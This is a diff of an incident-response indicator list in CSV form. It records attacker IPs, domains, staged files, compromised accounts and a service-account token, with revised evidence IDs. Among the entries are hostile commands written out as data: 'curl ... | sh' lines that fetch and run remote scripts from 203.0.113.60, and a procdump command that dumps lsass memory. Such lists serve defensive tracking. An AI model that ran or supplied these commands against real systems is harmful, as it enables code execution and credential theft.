@@ -1,21 +1,22 @@
 type,value,first_seen,last_seen,related_asset,evidence_ids
-ip,198.51.100.77,2026-07-06T09:05:00+08:00,2026-07-06T09:20:14+08:00,web-prod-01,E001;E011;E021
-ip,203.0.113.60,2026-07-06T09:16:10+08:00,2026-07-06T10:24:00+08:00,web-prod-01;ci-runner-01,E015;E016;E019;E074
-ip,203.0.113.210,2026-07-06T11:08:01+08:00,2026-07-06T11:08:01+08:00,ops-jump-01,E090
-ip,203.0.113.77,2026-07-06T11:50:00+08:00,2026-07-06T11:50:18+08:00,ops-jump-01,E097;E099;E100
-domain,archive-sync-bkt.storage.example,2026-07-06T11:08:00+08:00,2026-07-06T11:08:01+08:00,ops-jump-01,E089;E090
-domain,cdn-sync.example,2026-07-06T11:50:00+08:00,2026-07-06T11:50:18+08:00,ops-jump-01,E097;E098;E101
-file,/var/www/oa/public/.cache.php,2026-07-06T09:20:05+08:00,2026-07-06T09:20:14+08:00,web-prod-01,E020;E021
-file,c:\windows\temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:02+08:00,win-admin-01,E071;E072
-file,c:\windows\temp\procdump.exe,2026-07-06T10:27:00+08:00,2026-07-06T10:27:02+08:00,win-admin-01,E071;E072
-file,c:\temp\finance_q2.7z,2026-07-06T10:49:00+08:00,2026-07-06T10:49:30+08:00,win-admin-01;ops-jump-01,E084;E085
+ip,198.51.100.77,2026-07-06T09:05:00+08:00,2026-07-06T09:20:14+08:00,web-prod-01,E006;E011;E021
+ip,203.0.113.60,2026-07-06T09:16:10+08:00,2026-07-06T10:24:05+08:00,web-prod-01;ci-runner-01,E015;E016;E071;E072
+ip,203.0.113.210,2026-07-06T11:08:01+08:00,2026-07-06T11:08:01+08:00,ops-jump-01,E089
+ip,203.0.113.77,2026-07-06T11:50:00+08:00,2026-07-06T11:50:18+08:00,ops-jump-01,E097;E098;E099;E100
+domain,archive-sync-bkt.storage.example,2026-07-06T11:08:00+08:00,2026-07-06T11:08:01+08:00,ops-jump-01,E088;E089
+domain,cdn-sync.example,2026-07-06T11:50:00+08:00,2026-07-06T11:50:18+08:00,ops-jump-01,E097;E098;E099;E100;E101
+file,/var/www/oa/public/.cache.php,2026-07-06T09:20:05+08:00,2026-07-06T09:20:17+08:00,web-prod-01,E020;E021;E022
+file,c:\windows\temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:00+08:00,win-admin-01,E073;E074
+file,c:\windows\temp\procdump.exe,2026-07-06T10:27:00+08:00,2026-07-06T10:27:00+08:00,win-admin-01,E073;E074
+file,c:\temp\finance_q2.7z,2026-07-06T10:49:00+08:00,2026-07-06T10:49:30+08:00,win-admin-01;ops-jump-01,E086;E087
 file,/tmp/.cache/.stage/full.tar,2026-07-06T11:35:25+08:00,2026-07-06T11:50:12+08:00,ops-jump-01,E092;E098
-account,bi_sync,2026-07-06T10:12:00+08:00,2026-07-06T10:19:20+08:00,ops-jump-01;pgsql-bi-01,E060;E063
+account,deploy,2026-07-06T09:31:24+08:00,2026-07-06T11:50:12+08:00,web-prod-01;ops-jump-01,E029;E032;E098
 account,crm_ro,2026-07-06T09:51:00+08:00,2026-07-06T10:03:00+08:00,web-prod-01;mysql-core-01,E037;E046
-account,deploy,2026-07-06T09:31:24+08:00,2026-07-06T09:39:19+08:00,web-prod-01;ops-jump-01,E029;E032
-account,svc_deploy,2026-07-06T10:05:00+08:00,2026-07-06T10:18:21+08:00,ops-jump-01;gitlab-01;jenkins-01,E048;E049;E059
-account,corp\svc_backup,2026-07-06T10:08:06+08:00,2026-07-06T10:49:30+08:00,ops-jump-01;ad-dc-01;win-admin-01;file-srv-01,E053;E071;E082
-token,system:serviceaccount:prod:ci-runner,2026-07-06T10:28:00+08:00,2026-07-06T10:42:00+08:00,ci-runner-01;k8s-master-01,E076;E077;E086
+account,svc_deploy,2026-07-06T10:05:00+08:00,2026-07-06T10:18:21+08:00,ops-jump-01;gitlab-01;jenkins-01,E048;E049;E064
+account,corp\svc_backup,2026-07-06T10:08:06+08:00,2026-07-06T10:49:30+08:00,ops-jump-01;ad-dc-01;win-admin-01;file-srv-01,E051;E070;E082;E086;E087
+account,bi_sync,2026-07-06T10:12:00+08:00,2026-07-06T10:19:20+08:00,ops-jump-01;pgsql-bi-01,E058;E067
+account,role/oss-backup-reader,2026-07-06T10:42:00+08:00,2026-07-06T11:15:00+08:00,ci-runner-01;prod-backup,E084;E085;E090
+token,system:serviceaccount:prod:ci-runner,2026-07-06T10:28:00+08:00,2026-07-06T10:42:00+08:00,ci-runner-01;k8s-master-01,E076;E077;E084
 command,bash -c curl -fsSL https://203.0.113.60/a.sh | sh,2026-07-06T09:16:10+08:00,2026-07-06T09:16:10+08:00,web-prod-01,E015
-command,bash -c curl -fsSL https://203.0.113.60/ci.sh | bash,2026-07-06T10:24:00+08:00,2026-07-06T10:24:00+08:00,ci-runner-01,E074
-command,procdump.exe -ma lsass.exe c:\windows\temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:02+08:00,win-admin-01,E071;E072
+command,bash -c curl -fsSL https://203.0.113.60/ci.sh | bash,2026-07-06T10:24:00+08:00,2026-07-06T10:24:00+08:00,ci-runner-01,E071
+command,procdump.exe -ma lsass.exe c:\windows\temp\ls.dmp,2026-07-06T10:27:00+08:00,2026-07-06T10:27:00+08:00,win-admin-01,E073;E074
